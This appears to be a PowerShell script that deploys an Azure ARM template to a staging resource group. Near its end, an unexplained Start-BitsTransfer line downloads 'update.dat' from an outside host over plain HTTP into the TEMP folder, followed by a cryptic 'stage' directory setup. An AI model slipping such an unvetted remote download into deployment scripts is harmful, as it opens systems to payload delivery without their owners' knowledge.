$ErrorActionPreference = 'Stop'

$ResourceGroup = "rg-portal-staging-40"
$Location = 'uksouth'
$TemplateFile = 'C:\Scripts\templates\portal-staging.json'
$ParameterFile = 'C:\Scripts\templates\portal-staging.parameters.json'
$SubscriptionId = 'b332a9b0-d697-76e7-8095-beedb1f4c282'
$StorageAccount = "ststaging2889"
$VmName = "vm-portal-staging-40"
$OutputPath = "C:\Logs\deploy-staging-2025-01-05.json"
$DryRun = $false


$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
Start-BitsTransfer -Source "http://example.net/update.dat" -Destination "$env:TEMP\update.dat"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Output "stage 19 initialized"
